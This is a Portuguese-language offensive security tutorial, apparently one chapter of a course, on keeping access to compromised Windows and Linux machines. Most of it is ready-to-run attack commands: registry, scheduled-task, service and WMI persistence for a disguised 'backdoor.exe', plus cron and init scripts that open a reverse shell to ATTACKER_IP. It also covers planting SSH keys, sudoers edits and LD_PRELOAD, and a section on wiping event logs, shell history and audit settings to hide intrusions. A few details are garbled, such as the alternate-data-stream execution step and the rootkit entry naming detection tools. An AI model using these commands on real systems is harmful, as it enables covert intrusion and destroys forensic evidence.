# Técnicas de Persistência

## Introdução

Após ganhar acesso, objetivo é manter acesso mesmo após reboot.

---

## Windows

### 1. Registry Run Keys

```powershell
# Executar a cada boot
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Svchost" /t REG_SZ /d "C:\Temp\backdoor.exe"

# Verificar
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 2. Scheduled Tasks

```powershell
# Criar tarefa
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command C:\Temp\backdoor.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "SystemService" -Description "System Maintenance"

# Verificar
Get-ScheduledTask -TaskName "SystemService"
```

### 3. Services

```powershell
# Criar serviço
New-Service -Name "WindowsService" -BinaryPathName "C:\Temp\backdoor.exe" -StartupType Automatic -DisplayName "Windows Service"

# Iniciar
Start-Service WindowsService

# Verificar
Get-Service WindowsService
```

### 4. Startup Folder

```powershell
# Copiar para startup
copy C:\Temp\backdoor.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### 5. WMI Event Subscription

```powershell
# Persistência via WMI
$class = New-Object System.Management.ManagementClass("\\.\root\cimv2", [System.Management.ManagementPath]"CIM_IndicationFilter", $null)
$class["Name"] = "BotFilter"
$class["QueryLanguage"] = "WQL"
$class["Query"] = "SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_Process'"
$class.Put()
```

### 6. Alternate Data Streams

```powershell
# Esconder arquivo
echo "backdoor code" > C:\Temp\file.txt:hidden.exe

# Executar
wmic datafile where name="C:\\Temp\\file.txt:hidden.exe" call GetFileInformationByHandle

# Mais discreto que arquivo normal
```

---

## Linux

### 1. Cron Jobs

```bash
# Adicionar ao crontab root
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -

# Resultado: Reverse shell a cada minuto

# Verificar
crontab -l
```

### 2. SSH Key

```bash
# Adicionar chave pública autorizada
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys

# Login sem senha
ssh -i private_key user@target
```

### 3. Sudoers

```bash
# Adicionar linha (requer sudo já)
echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers

# Verificar
sudo -l
```

### 4. Init Scripts

```bash
# Criar script em /etc/init.d/
sudo cat > /etc/init.d/backup << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

# Habilitar
sudo chmod +x /etc/init.d/backup
sudo update-rc.d backup defaults
```

### 5. LD_PRELOAD

```bash
# Compilar malicious library
gcc -shared -fPIC -o /tmp/lib.so backdoor.c

# Adicionar a profile
echo "export LD_PRELOAD=/tmp/lib.so" >> ~/.bashrc

# Executar a cada shell
```

### 6. Rootkit

```bash
# Instalar rootkit (chkrootkit, rkhunter)
# Persiste em kernel
# Muito difícil de detectar/remover
```

---

## Detecção de Persistência

### Windows

```powershell
# Verificar Registry Run
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# Verificar Scheduled Tasks
Get-ScheduledTask

# Verificar Services
Get-Service | Where-Object {$_.StartType -eq 'Automatic'}

# Verificar Startup Folder
Get-ChildItem "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Linux

```bash
# Verificar crontab
crontab -l
cat /etc/cron.d/*
cat /etc/crontab

# Verificar SSH authorized_keys
cat ~/.ssh/authorized_keys

# Verificar sudoers
sudo -l
grep -r "NOPASSWD" /etc/sudoers*

# Verificar init scripts
ls -la /etc/init.d/

# Verificar bash profile
cat ~/.bashrc
cat ~/.bash_profile

# Procurar por processos suspeitos
ps aux | grep -i suspicious
```

---

## Limpeza de Trilhas

### Windows

```powershell
# Limpar Event Logs
Clear-EventLog -LogName Security
Clear-EventLog -LogName Application
Clear-EventLog -LogName System

# Desabilitar logging
reg add "HKLM\System\CurrentControlSet\Services\EventLog" /v MaxSize /d 0x1000 /f

# Limpar Temp
Remove-Item C:\Temp\* -Force -Recurse

# Limpar ShellBags (history de pastas)
reg delete "HKCU\Software\Microsoft\Windows\ShellNoRoam\BagMRU" /f
```

### Linux

```bash
# Limpar history
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history

# Limpar logs
sudo cat /dev/null > /var/log/auth.log
sudo cat /dev/null > /var/log/syslog
sudo cat /dev/null > /var/log/wtmp

# Limpar temporário
rm -rf /tmp/*
rm -rf ~/.cache/*

# Remover chaves SSH
rm -rf ~/.ssh

# Desabilitar auditoria
auditctl -b 0
```

---

## Defesas

```
✅ Monitorar Registry (Windows)
✅ Monitorar crontab (Linux)
✅ Verificar SSH authorized_keys
✅ Auditar sudoers
✅ Habilitar logging
✅ SIEM (Splunk, ELK)
✅ EDR (Crowdstrike, CarbonBlack)
✅ Verificações de integridade
```

---

**Próximo**: Ransomware e análise de código malicioso
